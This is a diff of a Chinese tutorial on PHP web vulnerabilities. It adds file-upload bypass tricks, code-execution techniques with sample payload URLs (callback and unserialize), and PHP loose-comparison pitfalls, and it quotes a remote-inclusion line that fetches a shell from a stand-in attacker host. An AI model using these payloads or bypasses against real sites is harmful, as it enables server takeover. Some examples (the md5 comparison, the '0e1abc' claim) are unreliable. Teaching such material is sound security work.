@@ -102,7 +102,51 @@ require_once "http://attacker/phpshell.txt?/action/m_share.php";
 
 ## 文件上传
 
+文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此文件获得了执行服务器端命令的能力。在大多数情况下，文件上传漏洞一般是指“上传 web 脚本能够被服务器解析”的问题，也就是所谓的 webshell 问题。完成这一攻击需要这样几个条件，一是上传的文件能够这web容器执行，其次用户能从web上访问这个文件，最后，如果上传的文件被安全检查、格式化、图片压缩等功能改变了内容，则可能导致攻击失败。
 
+### 绕过上传检查
+
+- 前端检查扩展名
+
+  抓包绕过即可。
+
+- `Content-Type` 检测文件类型
+
+  抓包修改 `Content-Type` 类型，使其符合白名单规则。
+
+- 服务端添加后缀
+
+  尝试 %00 截断。
+
+- 服务端扩展名检测
+
+  利用解析漏洞。
+
+  - Apache 解析
+
+    `phpshell.php.rar.rar.rar.rar` 因为Apache不认识 `.rar` 这个文件类型，所以会一直遍历后缀到 `.php`，然后认为这是一个PHP文件。
+
+  - IIS 解析
+
+    IIS 6 下当文件名为 `abc.asp;xx.jpg` 时，会将其解析为 `abc.asp`。
+
+  - PHP CGI 路径解析
+
+    当访问 `http://www.a.com/path/test.jpg/notexist.php` 时，会将 `test.jpg` 当做 PHP 解析，`notexist.php` 是不存在的文件。此时 Nginx 的配置如下
+
+    ```nginx
+    location ~ \.php$ {
+      root html;
+      fastcgi_pass 127.0.0.1:9000;
+      fastcgi_index index.php;
+      fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name;
+      include fastcgi_param;
+    }
+    ```
+
+- 其他方式
+
+  后缀大小写、双写、特殊后缀如 `php5` 等，修改包内容的大小写过 WAF 等。
 
 ## 变量覆盖
 
@@ -238,11 +282,219 @@ $dyn_func($argument);
 ?>
 ```
 
+### 反引号命令执行
 
+```php
+<?php
+echo `ls -al`;
+?>
+```
+
+### Curly Syntax
+
+PHP 的 Curly Syntax 也能导致代码执行，它将执行花括号间的代码，并将结果替换回去。
+
+```php
+<?php
+$var = "aaabbbccc ${`ls`}";
+?>
+```
+
+```php
+<?php
+$foobar = "phpinfo";
+${"foobar"}();
+?>
+```
+
+### 回调函数
+
+很多函数都可以执行回调函数，当回调函数用户可控时，将导致代码执行。
+
+```php
+<?php
+$evil_callback = $_GET["callback"];
+$some_array = array(0,1,2,3);
+$new_array = array_map($evil_callback, $some_array);
+?>
+```
+
+攻击 payload
+
+```
+http://www.a.com/index.php?callback=phpinfo
+```
+
+### 反序列化
+
+如果 `unserialize()` 在执行时定义了 `__destruct()` 或 `__wakeup()` 函数，则有可能导致代码执行。
+
+```php
+<?php
+class Example {
+  var $var = "";
+  function __destruct() {
+    eval($this->$var);
+  }
+}
+unserialize($_GET["saved_code"]);
+?>
+```
+
+攻击 payload
+
+```
+http://www.a.com/index.php?saved_code=O:7:"Example":1:{s:3:"var";s:10:"phpinfo();";}
+```
 
 ## PHP 特性
 
+### 数组
 
+```php
+<?php
+$var = 1;
+$var = array();
+$var = "string";
+?>
+```
+
+php不会严格检验传入的变量类型，也可以将变量自由的转换类型。
+
+比如在 `$a == $b` 的比较中 
+
+````
+$a = null; 
+$b = false; //为真 
+$a = ''; 
+$b = 0; //同样为真
+````
+
+然而，PHP 内核的开发者原本是想让程序员借由这种不需要声明的体系，更加高效的开发，所以在几乎所有内置函数以及基本结构中使用了很多松散的比较和转换，防止程序中的变量因为程序员的不规范而频繁的报错，然而这却带来了安全问题。
+
+```php
+0=='0' //true
+0 == 'abcdefg' //true
+0 === 'abcdefg' //false
+1 == '1abcdef' //true
+```
+
+### 魔法 Hash
+
+```php
+"0e132456789"=="0e7124511451155" //true
+"0e123456abc"=="0e1dddada" //false
+"0e1abc"=="0"  //true
+```
+
+在进行比较运算时，如果遇到了`0e\d+`这种字符串，就会将这种字符串解析为科学计数法。所以上面例子中2个数的值都是0因而就相等了。如果不满足`0e\d+`这种模式就不会相等。
+
+### 十六进制转换
+
+```php
+"0x1e240"=="123456" //true
+"0x1e240"==123456 //true
+"0x1e240"=="1e240" //false
+```
+
+当其中的一个字符串是 `0x` 开头的时候，PHP 会将此字符串解析成为十进制然后再进行比较，`0x1240` 解析成为十进制就是 123456，所以与 `int` 类型和 `string` 类型的 123456 比较都是相等。
+
+### 类型转换
+
+常见的转换主要就是 `int` 转换为 `string`，`string` 转换为 `int`。
+
+**`int` 转 `string`：**
+
+```php
+$var = 5;
+方式1：$item = (string)$var;
+方式2：$item = strval($var);
+```
+
+**`string` 转 `int`**：`intval()`函数。
+
+对于这个函数，可以先看 2 个例子。
+
+```php
+var_dump(intval('2')) //2
+var_dump(intval('3abcd')) //3
+var_dump(intval('abcd')) //0
+```
+
+说明`intval()`转换的时候，会将从字符串的开始进行转换知道遇到一个非数字的字符。即使出现无法转换的字符串，`intval()`不会报错而是返回0。
+
+同时，程序员在编程的时候也不应该使用如下的这段代码：
+
+```php
+if(intval($a)>1000) {
+ mysql_query("select * from news where id=".$a)
+}
+```
+
+这个时候 `$a` 的值有可能是 `1002 union`。
+
+### 内置函数的参数的松散性
+
+内置函数的松散性说的是，调用函数时给函数传递函数无法接受的参数类型。解释起来有点拗口，还是直接通过实际的例子来说明问题，下面会重点介绍几个这种函数。
+
+**md5()**
+
+```php
+$array1[] = array(
+ "foo" => "bar",
+ "bar" => "foo",
+);
+$array2 = array("foo", "bar", "hello", "world");
+var_dump(md5($array1)==var_dump($array2)); //true
+```
+
+PHP手册中的md5()函数的描述是`string md5 ( string $str [, bool $raw_output = false ] ) `，`md5()`中的需要是一个string类型的参数。但是当你传递一个array时，`md5()`不会报错，只是会无法正确地求出array的md5值，这样就会导致任意2个array的md5值都会相等。
+
+**strcmp()**
+
+`strcmp()`函数在PHP官方手册中的描述是`int strcmp ( string $str1 , string $str2 )` ,需要给`strcmp()`传递2个`string`类型的参数。如果 `str1`小于`str2`,返回-1，相等返回0，否则返回1。`strcmp()` 函数比较字符串的本质是将两个变量转换为ASCII，然后进行减法运算，然后根据运算结果来决定返回值。
+
+如果传入给出`strcmp()`的参数是数字呢？
+
+```php
+$array=[1,2,3];
+var_dump(strcmp($array,'123')); //null,在某种意义上null也就是相当于false。
+```
+
+**switch()**
+
+如果`switch()`是数字类型的case的判断时，switch会将其中的参数转换为int类型。如下：
+
+```php
+$i ="2abc";
+switch ($i) {
+case 0:
+case 1:
+case 2:
+ echo "i is less than 3 but not negative";
+ break;
+case 3:
+ echo "i is 3";
+}
+```
+
+这个时候程序输出的是`i is less than 3 but not negative`，是由于`switch()`函数将`$i`进行了类型转换，转换结果为2。
+
+**in_array()**
+
+在PHP手册中，`in_array()`函数的解释是`bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )` ,如果strict参数没有提供，那么in_array就会使用松散比较来判断`$needle`是否在`$haystack`中。当strince的值为true时，`in_array()`会比较needls的类型和haystack中的类型是否相同。
+
+```php
+$array=[0,1,2,'3'];
+var_dump(in_array('abc', $array)); //true
+var_dump(in_array('1bc', $array)); //true
+```
+
+可以看到上面的情况返回的都是true,因为`'abc'`会转换为0，`'1bc'`转换为1。
+
+`array_search()`与`in_array()`也是一样的问题。
 
 ## 寻找源代码备份
+
+
 
